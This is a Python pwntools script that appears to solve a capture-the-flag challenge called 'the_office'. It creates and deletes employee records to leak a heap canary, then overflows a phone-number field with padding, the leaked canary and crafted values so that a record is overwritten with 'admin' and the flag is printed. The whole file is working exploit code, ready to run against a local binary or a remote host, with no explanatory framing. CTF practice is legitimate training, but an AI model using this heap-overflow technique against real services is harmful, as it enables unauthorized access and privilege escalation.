#!/usr/bin/env python3

from pwn import context, log, p32, process, remote, sys

context.binary = 'the_office'
elf = context.binary


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], int(sys.argv[2])
    return remote(host, port)


def add_employee(p, name=b'a', email=None, salary=b'1', phone=b'b'):
    p.sendlineafter(b'token', b'1')
    p.sendlineafter(b'Name: ', name)

    if email:
        p.sendlineafter(b'Email (y/n)? ', b'y')
        p.sendlineafter(b'Email address: ', email)
    else:
        p.sendlineafter(b'Email (y/n)? ', b'n')

    p.sendlineafter(b'Salary: ', salary)
    p.sendlineafter(b'Phone #: ', phone)
    p.sendlineafter(b'Bldg (y/n)? ', b'n')


def main():
    p = get_process()

    add_employee(p, email=b'A' * 24)

    p.sendlineafter(b'token', b'2')
    p.sendlineafter(b'Employee #?\n', b'0')

    add_employee(p)
    add_employee(p)

    p.sendlineafter(b'token', b'3')
    p.recvuntil(b'Bldg #: ')
    p.recvuntil(b'Bldg #: ')

    canary = int(p.recvline().strip().decode())
    log.info(f'Leaked heap canary: {hex(canary)}')

    p.sendlineafter(b'token', b'2')
    p.sendlineafter(b'Employee #?\n', b'0')

    add_employee(p, phone=b'A' * 28 + p32(canary) + p32(0x35) * 2 + b'admin')  

    p.sendlineafter(b'token', b'4')
    p.sendlineafter(b'Employee #?\n', b'1')

    log.success(f'Flag: {p.recvline().decode()}')
    p.close()


if __name__ == '__main__':
    main()
